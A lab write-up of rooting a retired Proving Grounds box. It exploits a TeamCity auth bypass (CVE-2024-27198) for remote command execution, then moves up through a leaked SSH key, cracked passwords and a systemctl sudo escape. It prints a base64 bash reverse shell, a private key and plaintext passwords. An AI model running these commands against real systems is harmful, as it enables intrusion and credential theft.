---
machine: Scrutiny
platform: Proving Grounds
category: Linux
difficulty: Insane
tags: [teamcity, cve-2024-27198, auth-bypass, git-history-leak, ssh-key-cracking, credential-reuse, gtfobins]
date: 2026-09-14
status: retired
summary: A Linux box running JetBrains TeamCity behind a marketing site — testing exploitation of a real-world authentication-bypass CVE to enable debug-mode command execution, mining git commit history for a removed SSH key, offline key/password cracking, a chain of leaked credentials across several users, and a GTFOBins sudo escape for the path to root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/scrutiny]
└─$ nmap-full 192.168.131.91
[*] Running fast port discovery on 192.168.131.91...
[*] Open ports: 22,25,80,443
[*] Running full scan on 192.168.131.91...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-14 17:52 -0400
Nmap scan report for 192.168.131.91
Host is up (0.057s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
25/tcp  open   smtp    Postfix smtpd
| ssl-cert: Subject: commonName=onlyrands.com
| Subject Alternative Name: DNS:onlyrands.com
| Not valid before: 2024-06-07T09:33:24
|_Not valid after:  2034-06-05T09:33:24
|_smtp-commands: onlyrands.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: OnlyRands
443/tcp closed https
Service Info: Host:  onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds
[*] Checking if UDP/SNMP is up on 192.168.131.91...
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.131.91:161 using SNMPv1 and community 'public'

[!] 192.168.131.91:161 SNMP request timeout
```

If we navigate to the webapp and inspect the source code, we will see a `href` redirect to a subdomain called `team.onlyrands.com`. If we add that to our `/etc/hosts` and navigate to it we can see a new webapp surface.

This takes us to a login portal to `TeamCity` with a version number 2023.05.4 listed below:

![TeamCity login page showing Version 2023.05.4 (build 129421)](/media/Pasted%20image%2020260914170510.png)

We searchsploit for exploits which may be useful for us given our version of TeamCity:

```bash
┌──(kali㉿kali)-[~/oscp/scrutiny]
└─$ searchsploit teamcity 
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
JetBrains TeamCity 2018.2.4 - Remote Code Execution                                                                       | java/remote/47891.txt
JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                | java/remote/51884.py
JetBrains TeamCity 2023.11.4 - Authentication Bypass                                                                      | multiple/webapps/52411.py
TeamCity < 9.0.2 - Disabled Registration Bypass                                                                           | multiple/remote/46514.js
TeamCity Agent - XML-RPC Command Execution (Metasploit)                                                                   | multiple/remote/45917.rb
TeamCity Agent XML-RPC 10.0 - Remote Code Execution                                                                       | php/webapps/48201.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Foothold

The authentication bypass exploit seems like it may be the most applicable given our server uses an older version which should be vulnerable to it:

```bash
┌──(kali㉿kali)-[~/oscp/scrutiny]
└─$ python3 52411.py --url http://teams.onlyrands.com/login.html

 ████████╗███████╗ █████╗ ███╗   ███╗ ██████╗██╗████████╗██╗   ██╗                                                                                          
 ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║╚══██╔══╝╚██╗ ██╔╝                                                                                          
    ██║   █████╗  ███████║██╔████╔██║██║     ██║   ██║    ╚████╔╝                                                                                           
    ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║██║     ██║   ██║     ╚██╔╝                                                                                            
    ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╗██║   ██║      ██║                                                                                             
    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝   ╚═╝      ╚═╝                                                                                             
                                                                                                                                                            
    TeamCity Authentication Bypass (CVE-2024-27198)
                Author: ibrahimsql

=== CVE-2024-27198 TeamCity Exploit ===
Author: ibrahimsql
Target: http://teams.onlyrands.com/login.html
=============================================

[*] Checking target: http://teams.onlyrands.com/login.html
[+] Target is reachable
[*] Targeting: http://teams.onlyrands.com/login.html/idontexist?jsp=/app/rest/users;.jsp
[*] Attempting authentication bypass...
[+] Exploit successful!

[SUCCESS] Admin user created!
==================================================
Username: ibrahimsql
Password: ibrahimsql
Login URL: http://teams.onlyrands.com/login.html/login.html
==================================================
[+] Exploit completed!

```

We get an error when trying to sign in. We can use this 0xdf writeup as a reference for exploiting TeamCity: https://0xdf.gitlab.io/2024/08/24/htb-runner.html?source=post_page-----01737dd96583-----------------------------------------#

Make admin token for `ibrahimsql`

```bash
┌──(kali㉿kali)-[~/oscp/scrutiny]
└─$ curl -X POST http://teams.onlyrands.com/app/rest/users/id:21/tokens/RPC2 -u ibrahimsql:ibrahimsql
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="RPC2" creationTime="2026-09-14T22:36:17.649Z" value="eyJ0eXAiOiAiVENWMiJ9.bDRwS2xTUm84UjYtUTBFLUZfZXlLbUdTbGtz.Y2RiYTQ1OWQtNWY0My00ZTNlLWE3NWYtNGZkNDQ4ZGVmZWMw"/>
```

Now we can use this token to enable debug mode:

```bash
┌──(kali㉿kali)-[~/oscp/scrutiny]
└─$ export TOKEN="eyJ0eXAiOiAiVENWMiJ9.bDRwS2xTUm84UjYtUTBFLUZfZXlLbUdTbGtz.Y2RiYTQ1OWQtNWY0My00ZTNlLWE3NWYtNGZkNDQ4ZGVmZWMw"

┌──(kali㉿kali)-[~/oscp/scrutiny]
└─$ curl -X POST 'http://teams.onlyrands.com/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true' -H "Authorization: Bearer $TOKEN"
```

Refresh the webapp:

```bash
┌──(kali㉿kali)-[~/oscp/scrutiny]
└─$ curl 'http://teams.onlyrands.com/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties' -H "Authorization: Bearer $TOKEN" 

...
```

Now we can successfully execute commands without error:

```bash
┌──(kali㉿kali)-[~/oscp/scrutiny/RCity-CVE-2024-27198]
└─$ curl -X POST 'http://teams.onlyrands.com/app/rest/debug/processes?exePath=id' -H "Authorization: Bearer $TOKEN"
StdOut:uid=1015(git) gid=1005(git) groups=1005(git)

StdErr: 
Exit code: 0
Time: 22ms   
```

I was having trouble encoding a bash reverse shell into the POST exePath= field, so I downloaded a heavier weight exploit called RCity (https://github.com/Stuub/RCity-CVE-2024-27198) that I could pass commands through to handle the URL encoding for me. I then used a base64 encoded bash reverseshell and caught it in my listener for a foothold shell:

```bash
printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNTUvNDQzIDA+JjEpICY=|base64 -d|bash

┌──(kali㉿kali)-[~/oscp/scrutiny]
└─$ sudo penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 10.0.2.15 • 172.17.0.1 • 172.18.0.1 • 192.168.45.155
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => onlyrands.com 192.168.131.91 Linux-x86_64 👤 git(1015) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/onlyrands.com~192.168.131.91-Linux-x86_64/2026_09_14-19_13_31-379-git(1015).log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
git@onlyrands:~/software/TeamCity/bin$ whoami
git
```

This puts us in the path `/srv/git/software?TeamCity/bin` as user `git`, we can retrieve the local.txt from `/srv/git`

## Privilege Escalation

We can now sign into the TeamCity admin portal and look at the `.git` users and their git contributions via the GUI. While exploring we see that `Marco Tillman` made a commit called `Oops` in which he removed a file called `id_rsa`. This is likely an ssh private key which we can use to laterally move or privesc.

![TeamCity Pending Changes view for Marco Tillman showing an "Oops" commit that removed the file id_rsa](/media/Pasted%20image%2020260914184656.png)

We find the ssh key is:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
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
9EHV94yVIeYQzmagUFXqPqFVMSM=
-----END OPENSSH PRIVATE KEY-----

```

We can attempt to ssh into user `marcot` with this key after `chmod 700`ing the file we wrote:

```bash
┌──(kali㉿kali)-[~/oscp/scrutiny/RCity-CVE-2024-27198]
└─$ ssh -i priv.key marcot@target 
The authenticity of host 'target (192.168.131.91)' can't be established.
ED25519 key fingerprint is: SHA256:bdEzYRpG4k3NkIr03/E2H6ltJRUD52Zi5YA0fkNr/nY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
marcot@target's password: 
```

It still prompts us for a password! We can use `ssh2john` to convert the private key to a hash and attempt to crack the password offline with `hashcat` and `rockyou.txt`.

```bash
┌──(kali㉿kali)-[~/oscp/scrutiny/RCity-CVE-2024-27198]
└─$ ssh2john priv.key > priv.hash

┌──(kali㉿kali)-[~/oscp/scrutiny/RCity-CVE-2024-27198]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt priv.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cheer            (priv.key)     
1g 0:00:01:10 DONE (2026-09-14 19:53) 0.01422g/s 16.61p/s 16.61c/s 16.61C/s 753951..madison1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We find the password for the ssh key is `cheer`. We can sign into ssh using this private key and password and we find that we can successfully cred reuse the `cheer` password for marcot's account password:

```bash
┌──(kali㉿kali)-[~/oscp/scrutiny/RCity-CVE-2024-27198]
└─$ ssh -i priv.key marcot@target                             
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
marcot@target's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-182-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 14 Sep 2026 11:56:45 PM UTC

  System load:  0.06              Processes:               227
  Usage of /:   83.5% of 9.75GB   Users logged in:         0
  Memory usage: 66%               IPv4 address for ens160: 192.168.131.91
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Jun 13 04:30:18 2024 from 10.9.1.9
marcot@onlyrands:~$ sudo -l
[sudo] password for marcot: 
Sorry, user marcot may not run sudo on onlyrands.
```

If we explore the box we can find a email to Marco with a password in `/var/spool/mail/marcot`:

```text
marcot@onlyrands:/var/spool/mail$ cd marcot
-bash: cd: marcot: Not a directory
marcot@onlyrands:/var/spool/mail$ cat marcot 
From matthewa@onlyrands.com  Fri Jun  7 09:33:48 2024
Return-Path: <matthewa@onlyrands.com>
X-Original-To: marcot@onlyrands.com
Delivered-To: marcot@onlyrands.com
Received: by onlyrands.com (Postfix, from userid 1010)
        id E8D713650; Fri,  7 Jun 2024 09:33:48 +0000 (UTC)
From: matthewa@onlyrands.com
To: marcot@onlyrands.com
Subject: Goodbye, best friend
Date: Fri,  18 Feb 2022 08:43:11 (UTC)
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20240607093348.E8D713650@onlyrands.com>

Marco,

Dach, the imbecile, forgot to disable my access, so you can login using my account. The password is "IdealismEngineAshen476" (without the quotation marcot).

I've left you a parting gift--your eyes only.
I'm gonna miss you, pal. Catch you on the flip side.

Sincerely,
Matthew A.
```

We can try to `su` into matthews account:

```bash
marcot@onlyrands:/var/spool/mail$ su matthewa
Password: 
matthewa@onlyrands:/var/spool/mail$ 
```

If we explore `matthewa`'s home directory we see an interesting hidden file `.~`:

```bash
matthewa@onlyrands:~$ ls -lah
total 44K
drwxrwx---+ 3 matthewa freelancers 4.0K Jun  7  2024 .
drwxrwxr-x+ 7 root     root        4.0K Jun  7  2024 ..
-r--------+ 1 matthewa freelancers  120 Jun  7  2024 .~
-rw-rwxr--+ 1 matthewa freelancers  220 Jun  7  2024 .bash_logout
-rw-rwxr--+ 1 matthewa freelancers 3.8K Jun  7  2024 .bashrc
-rw-rw----+ 1 matthewa freelancers  119 Jun  7  2024 .gitconfig
-rw-rwxr--+ 1 matthewa freelancers  807 Jun  7  2024 .profile
drwxrwx---+ 3 matthewa freelancers 4.0K Jun  7  2024 work
```

```bash
matthewa@onlyrands:~$ cat .~
Dach's password is "RefriedScabbedWasting502". I saw it once when he had to use my terminal to check TeamCity's status.
```

We can use this to `su` into `briand`'s account (the d is for the last name Dach):

```bash
matthewa@onlyrands:~$ su briand
Password: 
briand@onlyrands:/home/freelancers/matthewa$ groups
administration
```

```bash
briand@onlyrands:/home/freelancers/matthewa$ sudo -l
Matching Defaults entries for briand on onlyrands:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User briand may run the following commands on onlyrands:
    (root) NOPASSWD: /usr/bin/systemctl status teamcity-server.service
```

We can check gtfobins and find that systemctl is listed. We see that if we run systemctl and input `!sh` we get a shell with the permissions it was run as:

```bash
briand@onlyrands:/home/freelancers/matthewa$ sudo /usr/bin/systemctl status teamcity-server.service
● teamcity-server.service - TeamCity Server
     Loaded: loaded (/lib/systemd/system/teamcity-server.service; enabled; vendor preset: enabled)
     Active: active (running) since Tue 2024-10-22 14:32:09 UTC; 1 years 10 months ago
   Main PID: 850 (sh)
      Tasks: 162 (limit: 2255)
     Memory: 1.4G
     CGroup: /system.slice/teamcity-server.service
             ├─ 850 sh teamcity-server.sh _start_internal
             ├─ 859 sh /srv/git/software/TeamCity/bin/teamcity-server-restarter.sh run
             ├─1196 /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -Djava.util.logging.config.file=/srv/git/s>
             ├─1811 /usr/lib/jvm/java-11-openjdk-amd64/bin/java -DTCSubProcessName=TeamCityMavenServer -classp>
             ├─2821 bash
             ├─2847 /usr/bin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("eNq>
             ├─2848 /usr/bin/bash -i
             ├─5088 git show 856f7c45f504b8f37593a2fff99c59e00a601e6e
             └─5089 /usr/bin/pager

Oct 22 14:32:09 onlyrands.com systemd[1]: Starting TeamCity Server...
Oct 22 14:32:09 onlyrands.com teamcity-server.sh[802]: Spawning TeamCity restarter in separate process
Oct 22 14:32:09 onlyrands.com teamcity-server.sh[802]: TeamCity restarter running with PID 850
Oct 22 14:32:09 onlyrands.com systemd[1]: Started TeamCity Server.
Sep 14 23:16:57 onlyrands.com sudo[3033]: pam_unix(sudo:auth): authentication failure; logname= uid=1015 euid=>
Sep 14 23:17:05 onlyrands.com postfix/sendmail[3050]: warning: inet_protocols: disabling IPv6 name/address sup>
Sep 14 23:17:05 onlyrands.com postfix/postdrop[3052]: warning: inet_protocols: disabling IPv6 name/address sup>
!sh
# whoami
root
```

We can retrieve the flag from `/root/proof.txt` and the box is rooted.
